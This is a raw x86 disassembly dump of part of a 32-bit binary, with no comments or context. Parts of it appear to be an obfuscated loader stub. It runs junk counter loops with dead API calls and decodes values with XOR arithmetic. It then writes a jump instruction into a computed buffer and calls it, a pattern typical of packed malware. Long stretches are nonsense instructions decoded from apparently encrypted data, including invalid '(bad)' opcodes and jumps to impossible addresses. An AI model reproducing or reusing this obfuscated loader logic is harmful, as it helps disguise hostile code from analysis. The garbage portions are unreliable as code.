  41b7fa:	or     BYTE PTR [ecx-0x72],dl
  41b7fd:	nop
  41b7fe:	enter  0xe65a,0x95
  41b802:	daa    
  41b803:	add    ebp,esi
  41b805:	pop    edx
  41b806:	jl     0x41b78c
  41b808:	jmp    0xd3c56182
  41b80d:	adc    BYTE PTR [ecx],bh
  41b80f:	adc    ebp,0xa5a63331
  41b815:	inc    ebx
  41b816:	inc    ebp
  41b817:	loope  0x41b81c
  41b819:	test   eax,0xbae70e07
  41b81e:	mov    eax,0xb234765a
  41b823:	cmp    cl,BYTE PTR [esi-0x11]
  41b826:	fst    QWORD PTR [ebp-0x46]
  41b829:	frstor [ebp+0x72]
  41b82c:	mov    eax,0x6aa6e20d
  41b831:	push   edi
  41b832:	(bad)  
  41b833:	(bad)  
  41b834:	stos   DWORD PTR es:[edi],eax
  41b835:	add    DWORD PTR [esp+ebx*2-0x5422a708],ecx
  41b83c:	or     al,0x74
  41b83e:	mov    dl,0xf3
  41b840:	rcl    BYTE PTR [esi],0x71
  41b843:	in     eax,0x4c
  41b845:	cmp    bl,ch
  41b847:	pop    edx
  41b848:	ror    BYTE PTR [edi],1
  41b84a:	add    ecx,DWORD PTR [edx]
  41b84c:	push   0xffffff8b
  41b84e:	dec    ebp
  41b84f:	cld    
  41b850:	and    DWORD PTR ds:0x428ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x428e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x4292df
  41b9ab:	mov    esi,DWORD PTR ds:0x429bd7
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42aa2f
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42aa33
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42aa37
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42aa3b
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42aa3f
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42aa0b
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42aa0f
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42aa13
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	dec    eax
  41bd53:	cmp    bl,dh
  41bd55:	pop    eax
  41bd56:	daa    
  41bd57:	std    
  41bd58:	add    BYTE PTR [ebx-0x7c7c9fd9],0x4e
  41bd5f:	jle    0x41bdcb
  41bd61:	xchg   BYTE PTR [edi+ebx*4-0x47],al
  41bd65:	scas   al,BYTE PTR es:[edi]
  41bd66:	jb     0x41bd01
  41bd68:	pop    ebp
  41bd69:	add    DWORD PTR [eax],ebx
  41bd6b:	and    DWORD PTR [esi+0x5335ae26],ebp
  41bd71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd72:	sub    dl,BYTE PTR [ebp-0x6a]
  41bd75:	cwde   
  41bd76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd77:	mov    DWORD PTR [ecx+0x47],esi
  41bd7a:	mov    DWORD PTR [ecx],edi
  41bd7c:	gs in  eax,dx
  41bd7e:	dec    edi
  41bd7f:	cdq    
  41bd80:	addr16 in al,dx
  41bd82:	lahf   
  41bd83:	fisubr WORD PTR [edi+0x59d7f700]
  41bd89:	push   es
  41bd8a:	adc    BYTE PTR [ebp+0x2b45f5d6],ch
  41bd90:	lahf   
  41bd91:	mov    al,ds:0xda724c14
  41bd96:	mov    ah,0x9d
  41bd98:	in     eax,dx
  41bd99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd9a:	and    eax,0xab2b45e9
  41bd9f:	or     ah,bl
  41bda1:	jne    0x41be18
  41bda3:	out    0x23,eax
  41bda5:	adc    BYTE PTR [eax],dl
  41bda7:	shl    BYTE PTR [edx+0xc],1
  41bdaa:	mov    BYTE PTR [esi],ch
  41bdac:	jl     0x41bd55
  41bdae:	push   ds
  41bdaf:	pop    ss
  41bdb0:	stos   BYTE PTR es:[edi],al
  41bdb1:	jecxz  0x41be2b
  41bdb3:	mov    DWORD PTR [ebp-0x6a],ebp
  41bdb6:	test   DWORD PTR [edx],0xfbbf308a
  41bdbc:	sub    eax,0xa437d56f
  41bdc1:	xchg   dh,ah
  41bdc3:	xchg   esi,eax
  41bdc4:	mov    dl,0xe
  41bdc6:	es push ecx
  41bdc8:	pop    ss
  41bdc9:	dec    ebx
  41bdca:	ins    DWORD PTR es:[edi],dx
  41bdcb:	outs   dx,DWORD PTR ds:[esi]
  41bdcc:	xlat   BYTE PTR ds:[ebx]
  41bdcd:	inc    edi
  41bdce:	sbb    ch,ch
  41bdd0:	pop    esp
  41bdd1:	test   al,0xb9
  41bdd3:	push   edx
  41bdd4:	mov    ebp,0xaa2f91c
  41bdd9:	jbe    0x41be06
  41bddb:	jnp    0x41be26
  41bddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdde:	out    0x3b,al
  41bde0:	ds dec edx
  41bde2:	mov    al,0xe4
  41bde4:	aad    0x51
  41bde6:	js     0x41bdbd
  41bde8:	jg     0x41bdbf
  41bdea:	stos   BYTE PTR es:[edi],al
  41bdeb:	out    0x72,eax
  41bded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdee:	fistp  WORD PTR fs:0x4ec8af83
  41bdf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdf6:	inc    esi
  41bdf7:	push   ecx
  41bdf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdf9:	addr16 (bad) 
  41bdfb:	ds jne 0x41be57
  41bdfe:	aas    
  41bdff:	mov    dh,0x8f
  41be01:	stos   DWORD PTR es:[edi],eax
  41be02:	rcr    DWORD PTR [ebx-0x6fe7886d],0x63
  41be09:	les    ecx,FWORD PTR [edi+ebp*2]
  41be0c:	cmp    DWORD PTR [ebp+0x3318e13b],esi
  41be12:	dec    dh
  41be14:	enter  0xe6ed,0xaf
  41be18:	ins    DWORD PTR es:[edi],dx
  41be19:	scas   eax,DWORD PTR es:[edi]
  41be1a:	cmp    al,BYTE PTR [esi]
  41be1c:	pop    ebx
  41be1d:	pop    ds
  41be1e:	mov    al,0x1b
  41be20:	sub    BYTE PTR [ebp+0x30ebe58e],0xbf
  41be27:	xchg   BYTE PTR [edx+ebp*4],dl
  41be2a:	(bad)  
  41be2b:	xlat   BYTE PTR ds:[ebx]
  41be2c:	add    cl,al
  41be2e:	inc    ebp
  41be2f:	out    0x39,eax
  41be31:	xchg   BYTE PTR [ecx-0x4ac0ca68],ch
  41be37:	int3   
  41be38:	mov    eax,0x9249a028
  41be3d:	int3   
  41be3e:	fimul  DWORD PTR [edi]
  41be40:	nop    DWORD PTR [ecx]
  41be43:	lock imul eax,DWORD PTR [edx],0x982c9192
  41be4a:	adc    eax,0x9e5e6ee8
  41be4f:	push   edi
  41be50:	inc    ecx
  41be51:	mov    al,ds:0x26c03e01
  41be56:	lods   eax,DWORD PTR ds:[esi]
  41be57:	xor    eax,0xbde39e67
  41be5c:	or     DWORD PTR [esi-0x283fd195],esp
  41be62:	jmp    0x41be10
  41be64:	cld    
  41be65:	add    al,0x7a
  41be67:	sbb    al,0x18
  41be69:	pop    eax
  41be6a:	or     al,0xfd
  41be6c:	ret    
  41be6d:	bound  edi,QWORD PTR [esi+0x1a379f33]
  41be73:	(bad)  
  41be75:	push   edi
  41be76:	lds    ebx,FWORD PTR ds:[ebp-0x2da58bb9]
  41be7d:	in     al,dx
  41be7e:	and    BYTE PTR [ebx-0x64585d2f],0xf1
  41be85:	jo     0x41be99
  41be87:	pusha  
  41be88:	jmp    0x5d527425
  41be8d:	inc    ebp
  41be8e:	mov    ds:0x5f7b1424,al
  41be93:	mov    cl,0xa0
  41be95:	dec    edx
  41be96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be97:	stc    
  41be98:	fnsave [edi]
  41be9a:	pop    esi
  41be9b:	lahf   
  41be9c:	enter  0xb694,0x7c
  41bea0:	fild   WORD PTR ds:[esi+eax*4]
  41bea4:	neg    BYTE PTR [ecx]
  41bea6:	jge    0x41bec2
  41bea8:	sub    eax,0x469376f3
  41bead:	cdq    
  41beae:	popf   
  41beaf:	aaa    
  41beb0:	les    ecx,FWORD PTR [eax-0x5d]
  41beb3:	aas    
  41beb4:	test   DWORD PTR [esp+edi*2],edi
  41beb7:	daa    
  41beb8:	sbb    ebx,DWORD PTR [eax+eax*2+0x4b]
  41bebc:	sub    BYTE PTR [eax-0x4f],ah
  41bebf:	mov    ebx,0xef0a5ece
  41bec4:	mov    cl,0x42
  41bec6:	xchg   ebp,eax
  41bec7:	mov    edi,0x37a3dba7
  41becc:	sbb    BYTE PTR [ebx+eax*1+0x36],bh
  41bed0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41bed2:	push   ss
  41bed3:	and    esi,DWORD PTR ds:0x4cb38e7d
  41bed9:	(bad)  
  41beda:	test   eax,0x99e83e61
  41bee0:	scas   al,BYTE PTR es:[edi]
  41bee1:	adc    BYTE PTR [ecx-0x22],0x19
  41bee5:	adc    al,0x34
  41bee7:	xor    edx,edi
  41bee9:	xor    ebp,esp
  41beeb:	(bad)  
  41beec:	rcr    DWORD PTR [esi+0x2165204],0xf4
  41bef3:	inc    ebp
  41bef4:	xchg   edi,eax
  41bef5:	sbb    DWORD PTR [esi+ecx*1-0x5c2319d7],0x23
  41befd:	mov    bl,0xd
  41beff:	scas   al,BYTE PTR es:[edi]
  41bf00:	fcomp  DWORD PTR [ecx]
  41bf02:	adc    al,0x53
  41bf04:	jp     0x41bf19
  41bf06:	in     al,0xba
  41bf08:	mov    DWORD PTR [esi-0x281f26d8],eax
  41bf0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf0f:	js     0x41bed1
  41bf11:	or     al,0x78
  41bf13:	fwait
  41bf14:	arpl   bx,di
  41bf16:	xor    al,0xfb
  41bf18:	mov    DWORD PTR [edx-0x67],0x7a563d9b
  41bf1f:	mov    cl,0x4b
  41bf21:	sub    al,0xd
  41bf23:	inc    BYTE PTR [ebp+0x6c]
  41bf26:	data16 mov dh,BYTE PTR [edi-0x562a14d4]
  41bf2d:	cmp    DWORD PTR [edx+0x1853ecfb],esp
  41bf33:	jecxz  0x41bee9
  41bf35:	xor    ch,dl
  41bf37:	add    DWORD PTR [esp+eax*2-0x55825f69],ebp
  41bf3e:	mov    dh,0x62
  41bf40:	ja     0x41beeb
  41bf42:	test   DWORD PTR [edx+0x1a0b533f],ecx
  41bf48:	add    ebx,DWORD PTR [esi-0x66bf3909]
  41bf4e:	jbe    0x41bf48
  41bf50:	xor    dl,0xf8
  41bf53:	xchg   ebp,eax
  41bf54:	and    DWORD PTR [ecx],ecx
  41bf56:	shr    DWORD PTR [esi],0x45
  41bf59:	ret    0xff36
  41bf5c:	js     0x41bf03
  41bf5e:	stos   DWORD PTR es:[edi],eax
  41bf5f:	dec    edx
  41bf60:	lea    ebx,[esi+edi*4-0x17b7733f]
  41bf67:	sti    
  41bf68:	xor    ch,bh
  41bf6a:	sub    ah,BYTE PTR [ebx+0x66fa0995]
  41bf70:	pop    ss
  41bf71:	sub    eax,0xa2780e36
  41bf76:	push   ds
  41bf77:	xchg   BYTE PTR [eax],ch
  41bf79:	jno    0x41bf41
  41bf7b:	out    0x8c,eax
  41bf7d:	js     0x41bf34
  41bf7f:	cmc    
  41bf80:	in     eax,0x5e
  41bf82:	and    al,0xa3
  41bf84:	jmp    0x41bf85
  41bf86:	xor    BYTE PTR [ebx-0x4e0f054],bh
  41bf8c:	add    ah,BYTE PTR [ebx+0x50fd8531]
  41bf92:	shl    DWORD PTR [eax+ebx*2],0x9b
  41bf96:	push   0xffffffd3
  41bf98:	cli    
  41bf99:	inc    esp
  41bf9a:	add    DWORD PTR [esp+eax*8],ecx
  41bf9d:	fmul   st(3),st
  41bf9f:	push   ecx
  41bfa0:	xor    edi,DWORD PTR [edx+edi*2+0x21]
  41bfa4:	or     BYTE PTR ds:0xe8dadbd1,ch
  41bfaa:	dec    eax
  41bfab:	cmp    BYTE PTR [ebx-0x7d5d31f0],0xc8
  41bfb2:	fadd   st(7),st
  41bfb4:	dec    ebp
  41bfb5:	test   eax,0x35f3a144
  41bfba:	out    0x48,eax
  41bfbc:	jmp    0xfceb17a2
  41bfc1:	mov    bh,0x5e
  41bfc3:	mov    dh,0x89
  41bfc5:	js     0x41bfb7
  41bfc7:	mov    bh,BYTE PTR [ecx-0x4f]
  41bfca:	stos   DWORD PTR es:[edi],eax
  41bfcb:	sbb    ebp,ecx
  41bfcd:	mov    eax,ds:0x92888b27
  41bfd2:	popa   
  41bfd3:	xchg   ebx,eax
  41bfd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfd5:	sbb    DWORD PTR ds:[esi],ebx
  41bfd8:	mov    ds:0xef1fa2ec,eax
  41bfdd:	pop    ds
  41bfde:	bound  edx,QWORD PTR [edi]
  41bfe0:	in     eax,0xf6
  41bfe2:	adc    DWORD PTR [edx],edi
  41bfe4:	dec    esi
  41bfe5:	(bad)  
  41bfe7:	adc    DWORD PTR [esi],edx
  41bfe9:	loope  0x41bfe7
  41bfeb:	mov    fs,WORD PTR [edx]
  41bfed:	ins    DWORD PTR es:[edi],dx
  41bfee:	fidiv  DWORD PTR [edi]
  41bff0:	in     eax,dx
  41bff1:	sub    eax,0x1dd8e2b3
  41bff6:	fidiv  DWORD PTR [esi]
  41bff8:	lods   eax,DWORD PTR ds:[esi]
  41bff9:	(bad)  
  41bffa:	aas    
  41bffb:	call   0x4eb07bf0
  41c000:	fst    QWORD PTR [ebp+0x70]
  41c003:	inc    esi
  41c004:	and    DWORD PTR [ebp-0x2fd2d02f],ebx
  41c00a:	loope  0x41c068
  41c00c:	(bad)  
  41c00d:	call   0x4d66:0xaa4e59ee
  41c014:	sub    BYTE PTR [ecx+0x6a],bh
  41c017:	(bad)  
  41c018:	(bad)  
  41c019:	sbb    eax,edx
  41c01b:	sbb    DWORD PTR [edi+0x60bd98ce],ebx
  41c021:	mov    al,ds:0xb4a66724
  41c026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c027:	out    0xbb,al
  41c029:	data16 xchg bh,dh
  41c02c:	sbb    edi,DWORD PTR [ebp-0x1d866864]
  41c032:	aad    0xaf
  41c034:	inc    ecx
  41c035:	push   ebp
  41c036:	fwait
  41c037:	jl     0x41c098
  41c039:	cld    
  41c03a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c03b:	dec    esi
  41c03c:	sbb    BYTE PTR [eax],0x1c
  41c03f:	push   eax
  41c040:	xor    al,0x73
  41c042:	pusha  
  41c043:	xchg   edx,eax
  41c044:	adc    edx,DWORD PTR [ecx]
  41c046:	aam    0xd1
  41c048:	call   0xa5bcbd60
  41c04d:	test   ebx,ebp
  41c04f:	mov    DWORD PTR [esi-0x50],ebp
  41c052:	das    
  41c053:	cli    
  41c054:	xor    DWORD PTR ds:0xa9d8cb74,edx
  41c05a:	jl     0x41bfe2
  41c05c:	push   eax
  41c05d:	mov    esi,DWORD PTR [esi]
  41c05f:	xor    cl,BYTE PTR [edi+edi*2+0x29109591]
  41c066:	xchg   ebx,eax
  41c067:	jmp    0x95623912
  41c06c:	int3   
  41c06d:	aam    0x86
  41c06f:	addr16 cmp ebp,ebp
  41c072:	xchg   ecx,eax
  41c073:	fdivp  st(0),st
  41c075:	xchg   edi,eax
  41c076:	or     BYTE PTR [edi+eiz*2],bl
  41c079:	pop    edi
  41c07a:	sbb    ebp,DWORD PTR [ebp-0x70442d7e]
  41c080:	hlt    
  41c081:	outs   dx,BYTE PTR ds:[esi]
  41c082:	int    0xf8
  41c084:	(bad)  
  41c085:	xlat   BYTE PTR ds:[ebx]
  41c086:	cmc    
  41c087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c088:	or     al,0xa3
  41c08a:	push   ds
  41c08b:	adc    eax,0xded8a504
  41c090:	jmp    0x41c078
  41c092:	retf   
  41c093:	popf   
  41c094:	lods   al,BYTE PTR ds:[esi]
  41c095:	repz ret 0x4b73
  41c099:	(bad)  
  41c09a:	or     eax,0xf323aae6
  41c09f:	mov    ah,0x7b
  41c0a1:	std    
  41c0a2:	sbb    eax,0x5b119e20
  41c0a7:	(bad)  
  41c0a8:	into   
  41c0a9:	aaa    
  41c0aa:	adc    DWORD PTR [edx],ebp
  41c0ac:	in     eax,dx
  41c0ad:	inc    ecx
  41c0ae:	inc    ebp
  41c0af:	fucom  st(4)
  41c0b1:	adc    eax,0x9fdf7bb3
  41c0b6:	jmp    0x41c06b
  41c0b8:	push   es
  41c0b9:	or     BYTE PTR [ebx+ecx*2],bh
  41c0bc:	xchg   ebp,eax
  41c0bd:	js     0x41c102
  41c0bf:	jmp    0x2607:0x6c8130
  41c0c6:	rcl    DWORD PTR [esi],0xe8
  41c0c9:	fisttp DWORD PTR [eax]
  41c0cb:	lods   al,BYTE PTR ds:[esi]
  41c0cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0cd:	popa   
  41c0ce:	sar    BYTE PTR [edx],1
  41c0d0:	mov    bh,0x27
  41c0d2:	or     ecx,DWORD PTR [esi-0x6f51d4e1]
  41c0d8:	iret   
  41c0d9:	xor    ebx,ecx
  41c0db:	inc    esp
  41c0dc:	and    DWORD PTR [eax+0x7c],ecx
  41c0df:	rcr    esi,1
  41c0e1:	add    cl,BYTE PTR [ebx+eiz*4]
  41c0e4:	pop    edi
  41c0e5:	out    0xe1,eax
  41c0e7:	xchg   esi,eax
  41c0e8:	mov    al,0x91
